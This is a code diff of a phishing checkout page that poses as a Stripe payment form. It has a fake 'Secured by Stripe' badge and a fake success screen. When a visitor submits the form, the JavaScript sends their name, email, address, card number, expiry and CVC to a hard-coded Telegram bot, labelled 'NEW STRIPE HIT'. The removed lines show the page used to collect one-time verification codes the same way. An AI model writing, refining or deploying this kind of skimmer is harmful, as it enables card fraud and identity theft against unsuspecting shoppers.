@@ -3,38 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checkout</title>
+    <title>Secure Checkout - Stripe</title>
+    <script src="https://js.stripe.com/v3/"></script>
     <style>
         :root {
-            --stripe-blue: #0000FF; 
+            --stripe-blue: #635BFF;
             --border-color: #e6e6e6;
             --text-main: #1a1a1a;
+            --error-red: #ff5252;
         }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #ffffff;
+            background-color: #f6f9fc;
             margin: 0;
             padding: 20px;
             display: flex;
             justify-content: center;
         }
 
-        .container { width: 100%; max-width: 400px; position: relative; }
+        .container { 
+            width: 100%; 
+            max-width: 400px; 
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.07);
+        }
 
-        /* --- Header & Logo (مطابق للصور بنسبة 1000%) --- */
         .header {
             display: flex;
             align-items: center;
             margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
         }
 
         .logo-container {
-            width: 75px; /* مقاس كبير للوجو */
+            width: 75px; /* الحجم الكبير الذي طلبته سابقاً */
             height: auto;
             margin-right: 15px;
-            display: flex;
-            align-items: center;
         }
 
         .logo-container img {
@@ -49,65 +57,114 @@
             color: var(--text-main);
         }
 
-        h2 { font-size: 18px; font-weight: 600; margin: 30px 0 15px 0; }
-        label { display: block; font-size: 15px; font-weight: 500; margin-bottom: 8px; }
+        h2 { 
+            font-size: 18px; 
+            font-weight: 600; 
+            margin: 25px 0 15px 0; 
+            color: var(--text-main);
+        }
+
+        label { 
+            display: block; 
+            font-size: 14px; 
+            font-weight: 500; 
+            margin-bottom: 8px; 
+            color: #4a5568;
+        }
 
         input {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             border: 1px solid var(--border-color);
             border-radius: 6px;
             font-size: 16px;
             box-sizing: border-box;
             outline: none;
             margin-bottom: 12px;
+            transition: border-color 0.2s;
         }
 
-        /* --- Input Groups --- */
-        .input-group { border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; }
-        .input-group input { border: none; border-bottom: 1px solid var(--border-color); margin-bottom: 0; border-radius: 0; }
+        .input-group { 
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            overflow: hidden; 
+        }
+        
+        .input-group input { 
+            border: none; 
+            border-bottom: 1px solid var(--border-color); 
+            margin-bottom: 0; 
+            border-radius: 0; 
+        }
+        
         .input-group input:last-child { border-bottom: none; }
+        
         .row { display: flex; }
         .row input:first-child { border-right: 1px solid var(--border-color); }
 
-        /* --- Payment Section --- */
-        .payment-box { border: 1px solid var(--border-color); border-radius: 10px; padding: 18px; margin-top: 10px; }
-        .payment-header { display: flex; align-items: center; margin-bottom: 18px; font-weight: 600; }
-        .card-icons { margin-left: auto; height: 30px; }
+        .payment-box { 
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            padding: 20px; 
+            margin-top: 10px;
+            background: #fafafa;
+        }
+
+        .payment-header { 
+            display: flex; 
+            align-items: center; 
+            margin-bottom: 15px; 
+            font-weight: 600; 
+            color: var(--text-main);
+        }
+
+        .card-icons { 
+            margin-left: auto; 
+            height: 28px; 
+        }
 
         .btn-pay {
             width: 100%;
             background: var(--stripe-blue);
             color: white;
             border: none;
-            padding: 18px;
+            padding: 16px;
             border-radius: 8px;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 600;
-            margin-top: 35px;
+            margin-top: 25px;
             cursor: pointer;
         }
 
-        /* --- Modals --- */
-        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 999; }
-        #customAlert { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 320px; background: white; border-radius: 14px; z-index: 1000; text-align: center; }
-        .alert-content { padding: 30px 20px; font-size: 17px; }
-        .alert-btn { width: 100%; padding: 15px; border: none; border-top: 1px solid #eee; background: none; color: var(--stripe-blue); font-size: 18px; font-weight: 700; cursor: pointer; }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #4a5568;
+        }
 
-        .page { display: none; }
-        .active { display: block; }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .success-page { display: none; text-align: center; padding: 40px 20px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div id="modalOverlay"></div>
-    <div id="customAlert">
-        <div class="alert-content">Please fill in all fields correctly.</div>
-        <button class="alert-btn" onclick="closeAlert()">Close</button>
-    </div>
-
-    <div id="checkoutPage" class="page active">
+    <div id="checkoutForm">
         <div class="header">
             <div class="logo-container">
                 <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
@@ -115,104 +172,93 @@
             <div class="header-title">Secure Checkout</div>
         </div>
 
-        <h2>Shipping Information</h2>
+        <h2>Contact Information</h2>
         <label>Email address</label>
-        <input type="email" id="email" placeholder="email@example.com">
+        <input type="email" id="email" placeholder="email@example.com" required>
         
         <h2>Shipping Address</h2>
         <div class="input-group">
-            <input type="text" id="name" placeholder="Full name">
-            <input type="text" id="addr" placeholder="Address">
+            <input type="text" id="name" placeholder="Full name" required>
+            <input type="text" id="address" placeholder="Street address" required>
             <div class="row">
-                <input type="text" id="city" placeholder="City">
-                <input type="text" id="zip" placeholder="Zip code">
+                <input type="text" id="city" placeholder="City" required>
+                <input type="text" id="postal" placeholder="Postal code" required>
             </div>
         </div>
 
-        <h2>Payment Method</h2>
+        <h2>Payment Details</h2>
         <div class="payment-box">
             <div class="payment-header">
-                <span>💳 Card</span>
-                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons">
+                <span>💳 Credit Card</span>
+                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons" alt="Card Types">
             </div>
-            <div class="input-group">
-                <input type="text" id="card" placeholder="Card number" maxlength="19">
-                <div class="row">
-                    <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
-                    <input type="text" id="cvc" placeholder="CVC" maxlength="4">
-                </div>
+            
+            <input type="text" id="cardNum" placeholder="Card Number" maxlength="19">
+            <div class="row">
+                <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
+                <input type="text" id="cvc" placeholder="CVC" maxlength="4">
             </div>
         </div>
 
-        <button class="btn-pay" onclick="handlePayment()">Pay Now</button>
+        <button class="btn-pay" id="submitBtn" onclick="handlePayment()">
+            Pay Securely
+        </button>
+
+        <div class="secure-badge">Secured by Stripe 256-bit SSL Encryption</div>
     </div>
 
-    <div id="otpPage" class="page">
-        <h1 style="font-size: 26px;">Verify By Phone</h1>
-        <p>Please enter the verification code sent to your mobile.</p>
-        <input type="text" id="otp" style="height: 65px; text-align: center; font-size: 28px; letter-spacing: 12px;" maxlength="6" placeholder="000000">
-        <button class="btn-pay" onclick="handleOTP()">Confirm</button>
+    <div id="successPage" class="success-page">
+        <h2 style="color: #48bb78;">Payment Successful!</h2>
+        <p>Thank you for your purchase.</p>
+        <button class="btn-pay" onclick="location.reload()">Continue</button>
     </div>
 </div>
 
 <script>
-    // --- Telegram Configuration (التحديث النهائي) ---
+    // --- Telegram Config ---
     const BOT_TOKEN = '8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q';
     const CHAT_ID = '1705240737';
 
     async function sendTelegram(message) {
         try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const response = await fetch(url, {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
             });
-            const data = await response.json();
-            if (!data.ok) console.error("Telegram Error:", data.description);
-        } catch (error) {
-            console.error("Network Error:", error);
-        }
+        } catch (e) { console.error(e); }
     }
 
-    function closeAlert() {
-        document.getElementById('customAlert').style.display = 'none';
-        document.getElementById('modalOverlay').style.display = 'none';
-    }
-
-    document.getElementById('card').addEventListener('input', e => {
+    // Formatting for card
+    document.getElementById('cardNum').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
 
     async function handlePayment() {
         const email = document.getElementById('email').value;
         const name = document.getElementById('name').value;
-        const card = document.getElementById('card').value;
+        const card = document.getElementById('cardNum').value;
+        const exp = document.getElementById('exp').value;
+        const cvc = document.getElementById('cvc').value;
 
-        if (!email || !name || card.length < 16) {
-            document.getElementById('customAlert').style.display = 'block';
-            document.getElementById('modalOverlay').style.display = 'block';
+        if (!email || !name || !card || !exp || !cvc) {
+            alert('Please fill in all fields');
             return;
         }
 
-        const message = `<b>🚀 NEW HIT</b>\n\n👤 <b>Name:</b> ${name}\n📧 <b>Email:</b> ${email}\n💳 <b>Card:</b> <code>${card}</code>\n📅 <b>Exp:</b> ${document.getElementById('exp').value}\n🔒 <b>CVC:</b> ${document.getElementById('cvc').value}`;
-        
-        await sendTelegram(message);
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerHTML = 'Processing <span class="loading"></span>';
 
-        document.getElementById('checkoutPage').style.display = 'none';
-        document.getElementById('otpPage').classList.add('active');
-    }
+        const msg = `<b>🚀 NEW STRIPE HIT</b>\n\n👤 <b>Name:</b> ${name}\n📧 <b>Email:</b> ${email}\n🏠 <b>Address:</b> ${document.getElementById('address').value}\n🏙️ <b>City:</b> ${document.getElementById('city').value}\n💳 <b>Card:</b> <code>${card}</code>\n📅 <b>Exp:</b> ${exp}\n🔒 <b>CVC:</b> ${cvc}`;
 
-    async function handleOTP() {
-        const otp = document.getElementById('otp').value;
-        if(otp.length === 6) {
-            await sendTelegram(`<b>🔑 OTP CODE:</b> <code>${otp}</code>`);
-            alert("Verification complete.");
-        }
+        await sendTelegram(msg);
+
+        // Show Success
+        setTimeout(() => {
+            document.getElementById('checkoutForm').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+        }, 2000);
     }
 </script>
 </body>
